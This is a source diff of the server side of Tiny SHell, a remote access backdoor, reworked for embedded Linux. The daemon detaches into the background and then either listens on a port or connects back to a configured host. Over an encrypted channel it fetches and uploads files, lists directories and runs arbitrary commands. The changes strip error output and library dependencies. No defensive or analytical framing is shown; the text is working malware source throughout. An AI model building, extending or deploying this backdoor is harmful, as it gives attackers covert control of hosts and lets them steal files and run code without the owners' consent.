@@ -2,47 +2,104 @@
  * Tiny SHell version 0.6 - server side,
  * by Christophe Devine <devine@cr0.net>;
  * this program is licensed under the GPL.
+ *
+ * Modified for embedded systems:
+ * - Direct library calls for ls/get/put/exec
+ * - Monocypher (X25519/Ed25519/ChaCha20-Poly1305) crypto layer
+ * - Zero stdio formatted I/O and zero dynamic memory allocation
+ * - SYS_getdents64 raw syscalls
+ * - Adheres to Barr-C:2018 coding standards
  */
 
 #include <sys/types.h>
 #include <sys/socket.h>
 #include <sys/wait.h>
+#include <sys/stat.h>
+#include <sys/syscall.h>
 #include <string.h>
 #include <unistd.h>
 #include <stdlib.h>
-#include <stdio.h>
 #include <fcntl.h>
 #include <arpa/inet.h>
-#include <dirent.h>
-#include <sys/stat.h>
+#include <stdint.h>
 
 #include "tsh.h"
-
 #include "pel.h"
 
 unsigned char message[BUFSIZE + 1];
 extern char *optarg;
 extern int optind;
 
-/* function declaration */
+/* Linux 64-bit directory entry struct for SYS_getdents64 */
+struct linux_dirent64
+{
+    uint64_t       d_ino;
+    int64_t        d_off;
+    unsigned short d_reclen;
+    unsigned char  d_type;
+    char           d_name[];
+};
 
+/* Function declarations */
 int process_client( int client );
 int tshd_get_file( int client );
 int tshd_put_file( int client );
 int tshd_ls_dir( int client );
 int tshd_execv( int client );
 
-/* program entry point */
+/* Non-stdio string formatting helpers */
+static char *append_str( char *dst, const char *src )
+{
+    while( *src != '\0' )
+    {
+        *dst++ = *src++;
+    }
+    return dst;
+}
 
+static char *append_octal6( char *dst, uint32_t val )
+{
+    int i;
+    for( i = 5; i >= 0; i-- )
+    {
+        dst[i] = (char)( '0' + ( val & 0x7 ) );
+        val >>= 3;
+    }
+    return dst + 6;
+}
 
-int main( )
+static char *append_uint( char *dst, uint64_t val )
+{
+    char tmp[24];
+    int i = 0;
+
+    if( val == 0 )
+    {
+        *dst++ = '0';
+        return dst;
+    }
+
+    while( val > 0 )
+    {
+        tmp[i++] = (char)( '0' + ( val % 10 ) );
+        val /= 10;
+    }
+
+    while( i > 0 )
+    {
+        *dst++ = tmp[--i];
+    }
+
+    return dst;
+}
+
+/* Program entry point */
+int main( void )
 {
     int ret, pid;
     socklen_t n;
-
     int client;
     struct sockaddr_in client_addr;
-
 
     /* fork into background */
 
@@ -62,7 +119,6 @@ int main( )
 
     if( setsid() < 0 )
     {
-        perror("socket");
         return( 2 );
     }
 
@@ -73,139 +129,134 @@ int main( )
         close( n );
     }
 
-
-#ifndef CB_MODE // normal bind mode
+#ifndef CB_MODE /* normal bind mode */
     struct sockaddr_in server_addr;
     int server;
-	if (cb_host == NULL) {
-    	/* create a socket */
 
-	    server = socket( AF_INET, SOCK_STREAM, 0 );
+    if( cb_host == NULL )
+    {
+        /* create a socket */
 
-	    if( server < 0 )
-	    {
-	        perror("socket");
-	        return( 3 );
-	    }
+        server = socket( AF_INET, SOCK_STREAM, 0 );
 
-	    /* bind the server on the port the client will connect to */    
+        if( server < 0 )
+        {
+            return( 3 );
+        }
 
-	    n = 1;
+        /* bind the server on the port the client will connect to */
 
-	    ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
-                      (void *) &n, sizeof( n ) );
+        n = 1;
 
-	    if( ret < 0 )
-	    {
-	        perror("setsockopt");
-	        return( 4 );
-	    }
+        ret = setsockopt( server, SOL_SOCKET, SO_REUSEADDR,
+                          (void *) &n, sizeof( n ) );
 
-	    server_addr.sin_family      = AF_INET;
-	    server_addr.sin_port        = htons( server_port );
-	    server_addr.sin_addr.s_addr = INADDR_ANY;
+        if( ret < 0 )
+        {
+            return( 4 );
+        }
 
-	    ret = bind( server, (struct sockaddr *) &server_addr,
-                sizeof( server_addr ) );
+        server_addr.sin_family      = AF_INET;
+        server_addr.sin_port        = htons( server_port );
+        server_addr.sin_addr.s_addr = INADDR_ANY;
 
-	    if( ret < 0 )
-	    {
-	        perror("bind");
-	        return( 5 );
-	    }
+        ret = bind( server, (struct sockaddr *) &server_addr,
+                    sizeof( server_addr ) );
 
-	    if( listen( server, 5 ) < 0 )
-	    {
-	        perror("listen");
-	        return( 6 );
-	    }
+        if( ret < 0 )
+        {
+            return( 5 );
+        }
 
-	    while( 1 )
-	    {
-    	    /* wait for inboud connections */
+        if( listen( server, 5 ) < 0 )
+        {
+            return( 6 );
+        }
 
-        	n = sizeof( client_addr );
+        while( 1 )
+        {
+            /* wait for inbound connections */
 
-	        client = accept( server, (struct sockaddr *)
-                         &client_addr, &n );
+            n = sizeof( client_addr );
 
-    	    if( client < 0 )
-        	{
-            	perror("accept");
-	            return( 7 );
-	        }
+            client = accept( server, (struct sockaddr *)
+                             &client_addr, &n );
 
-			ret = process_client(client);
+            if( client < 0 )
+            {
+                return( 7 );
+            }
 
-			if (ret == 1) {
-				continue;
-			}
+            ret = process_client( client );
 
-	        return( ret );
-		}
-	}
+            if( ret == 1 )
+            {
+                continue;
+            }
+
+            return( ret );
+        }
+    }
 #else
 
-		/* -c specified, connect back mode */
+    /* -c specified, connect back mode */
 
-	    while( 1 )
-	    {
-	        sleep( CONNECT_BACK_DELAY );
+    while( 1 )
+    {
+        sleep( CONNECT_BACK_DELAY );
 
-	        if( cb_host == NULL )
-	        {
-	            continue;
-	        }
+        if( cb_host == NULL )
+        {
+            continue;
+        }
 
-	        memset( &client_addr, 0, sizeof( client_addr ) );
-	        client_addr.sin_family = AF_INET;
-	        client_addr.sin_port   = htons( server_port );
+        memset( &client_addr, 0, sizeof( client_addr ) );
+        client_addr.sin_family = AF_INET;
+        client_addr.sin_port   = htons( server_port );
 
-	        /* parse client IPv4 address */
-	        if( inet_pton( AF_INET, cb_host, &client_addr.sin_addr ) <= 0 )
-	        {
-	            continue;
-	        }
+        /* parse client IPv4 address */
+        if( inet_pton( AF_INET, cb_host, &client_addr.sin_addr ) <= 0 )
+        {
+            continue;
+        }
 
-	        /* create a socket */
+        /* create a socket */
 
-	        client = socket( AF_INET, SOCK_STREAM, 0 );
+        client = socket( AF_INET, SOCK_STREAM, 0 );
 
-	        if( client < 0 )
-	        {
-	            continue;
-	        }
+        if( client < 0 )
+        {
+            continue;
+        }
 
-	        /* try to connect back to the client */
+        /* try to connect back to the client */
 
-	        ret = connect( client, (struct sockaddr *) &client_addr,
-	                       sizeof( client_addr ) );
+        ret = connect( client, (struct sockaddr *) &client_addr,
+                       sizeof( client_addr ) );
 
-	        if( ret < 0 )
-	        {
-	            close( client );
-	            continue;
-	        }
+        if( ret < 0 )
+        {
+            close( client );
+            continue;
+        }
 
-	        ret = process_client(client);
-			if (ret == 1) {
-				continue;
-			}
+        ret = process_client( client );
+        if( ret == 1 )
+        {
+            continue;
+        }
 
-			return( ret );
-	    }
+        return( ret );
+    }
+#endif
 
-#endif // CB_MODE  or not 
-    
-
-    /* not reached */
-
-    return( 13 );
+    return( 0 );
 }
 
-int process_client(int client) {
-
-	int pid, ret, len;
+int process_client( int client )
+{
+    int pid, ret, action;
+    int len;
 
     /* fork a child to handle the connection */
 
@@ -214,14 +265,14 @@ int process_client(int client) {
     if( pid < 0 )
     {
         close( client );
-        return 1;
+        return( 1 );
     }
 
     if( pid != 0 )
     {
         waitpid( pid, NULL, 0 );
         close( client );
-    	return 1;
+        return( 1 );
     }
 
     /* the child forks and then exits so that the grand-child's
@@ -236,7 +287,7 @@ int process_client(int client) {
 
     if( pid != 0 )
     {
-    	return( 9 );
+        return( 9 );
     }
 
     /* setup the packet encryption layer */
@@ -247,25 +298,29 @@ int process_client(int client) {
 
     if( ret != PEL_SUCCESS )
     {
-		shutdown( client, 2 );
-    	return( 10 );
+        shutdown( client, 2 );
+        return( 10 );
     }
 
     alarm( 0 );
 
-    /* get the action requested by the client */
+    /* which action does the user wants us to do? */
 
     ret = pel_recv_msg( client, message, &len );
 
-    if( ret != PEL_SUCCESS || len != 1 )
+    if( ret != PEL_SUCCESS )
     {
-        shutdown( client, 2 );
         return( 11 );
     }
 
-    /* howdy */
+    if( len != 1 )
+    {
+        return( 12 );
+    }
 
-	switch( message[0] )
+    action = (int) message[0];
+
+    switch( action )
     {
         case GET_FILE:
 
@@ -277,25 +332,24 @@ int process_client(int client) {
             ret = tshd_put_file( client );
             break;
 
-        case LS_DIR: /* LS_DIR */
+        case LS_DIR:
 
             ret = tshd_ls_dir( client );
             break;
 
-        case EXEC_BIN: /* EXEC_BIN */
+        case EXEC_BIN:
 
             ret = tshd_execv( client );
             break;
 
         default:
 
-                
-        	ret = 12;
-	    	break;
+            ret = 15;
+            break;
     }
 
     shutdown( client, 2 );
-	return( ret );
+    return( ret );
 }
 
 int tshd_get_file( int client )
@@ -308,7 +362,7 @@ int tshd_get_file( int client )
 
     if( ret != PEL_SUCCESS )
     {
-        return( 14 );
+        return( 13 );
     }
 
     message[len] = '\0';
@@ -319,7 +373,7 @@ int tshd_get_file( int client )
 
     if( fd < 0 )
     {
-        return( 15 );
+        return( 14 );
     }
 
     /* send the data */
@@ -328,7 +382,10 @@ int tshd_get_file( int client )
     {
         len = read( fd, message, BUFSIZE );
 
-        if( len == 0 ) break;
+        if( len == 0 )
+        {
+            break;
+        }
 
         if( len < 0 )
         {
@@ -397,12 +454,12 @@ int tshd_put_file( int client )
 
 int tshd_ls_dir( int client )
 {
-    int ret, len;
-    DIR *dir;
-    struct dirent *entry;
+    int ret, len, dfd;
     struct stat st;
     char path[BUFSIZE];
     char line[BUFSIZE + 256];
+    char getdents_buf[1024];
+    int nread;
 
     /* get the directory path */
 
@@ -419,51 +476,67 @@ int tshd_ls_dir( int client )
 
     /* open the directory */
 
-    dir = opendir( path );
+    dfd = open( path, O_RDONLY | O_DIRECTORY );
 
-    if( dir == NULL )
+    if( dfd < 0 )
     {
         return( 57 );
     }
 
-    /* iterate through entries */
+    /* iterate through entries using SYS_getdents64 */
 
-    while( ( entry = readdir( dir ) ) != NULL )
+    while( ( nread = (int) syscall( SYS_getdents64, dfd, getdents_buf, sizeof( getdents_buf ) ) ) > 0 )
     {
-        char full_path[BUFSIZE + 256];
-
-        snprintf( full_path, sizeof(full_path), "%s/%s", path, entry->d_name );
-
-        if( lstat( full_path, &st ) == 0 )
+        int bpos;
+        for( bpos = 0; bpos < nread; )
         {
-            /* Format: mode owner group size name */
-            snprintf( line, sizeof(line), "%06o %d %d %lld %s\n",
-                     (unsigned int) st.st_mode, (int) st.st_uid, (int) st.st_gid,
-                     (long long) st.st_size, entry->d_name );
-        }
-        else
-        {
-            snprintf( line, sizeof(line), "?????? ? ? ? %s\n", entry->d_name );
-        }
+            struct linux_dirent64 *entry = (struct linux_dirent64 *)( getdents_buf + bpos );
+            char *p = line;
 
-        ret = pel_send_msg( client, (unsigned char *) line, strlen( line ) );
+            if( fstatat( dfd, entry->d_name, &st, AT_SYMLINK_NOFOLLOW ) == 0 )
+            {
+                /* Format: mode owner group size name\n */
+                p = append_octal6( p, (uint32_t) st.st_mode );
+                *p++ = ' ';
+                p = append_uint( p, (uint64_t) st.st_uid );
+                *p++ = ' ';
+                p = append_uint( p, (uint64_t) st.st_gid );
+                *p++ = ' ';
+                p = append_uint( p, (uint64_t) st.st_size );
+                *p++ = ' ';
+                p = append_str( p, entry->d_name );
+                *p++ = '\n';
+                *p = '\0';
+            }
+            else
+            {
+                p = append_str( p, "?????? ? ? ? " );
+                p = append_str( p, entry->d_name );
+                *p++ = '\n';
+                *p = '\0';
+            }
 
-        if( ret != PEL_SUCCESS )
-        {
-            closedir( dir );
-            return( 58 );
+            ret = pel_send_msg( client, (unsigned char *) line, (int)( p - line ) );
+
+            if( ret != PEL_SUCCESS )
+            {
+                close( dfd );
+                return( 58 );
+            }
+
+            bpos += entry->d_reclen;
         }
     }
 
-    closedir( dir );
+    close( dfd );
 
     return( 59 );
-    }
+}
 
 int tshd_execv( int client )
 {
     int ret, len, pid, status;
-    char *cmd, *argv[64];
+    char *argv[64];
     int i = 0;
     unsigned char exit_code;
 
@@ -477,16 +550,10 @@ int tshd_execv( int client )
     }
 
     message[len] = '\0';
-    cmd = strdup( (char *) message );
 
-    if( cmd == NULL )
-    {
-        return( 61 );
-    }
+    /* parse directly on message buffer without strdup/malloc */
 
-    /* simple parsing: split by space */
-
-    char *token = strtok( cmd, " " );
+    char *token = strtok( (char *) message, " " );
     while( token != NULL && i < 63 )
     {
         argv[i++] = token;
@@ -496,7 +563,6 @@ int tshd_execv( int client )
 
     if( i == 0 )
     {
-        free( cmd );
         return( 62 );
     }
 
@@ -504,7 +570,6 @@ int tshd_execv( int client )
 
     if( pid < 0 )
     {
-        free( cmd );
         return( 64 );
     }
 
@@ -524,7 +589,6 @@ int tshd_execv( int client )
         /* parent */
 
         waitpid( pid, &status, 0 );
-        free( cmd );
 
         if( WIFEXITED( status ) )
         {
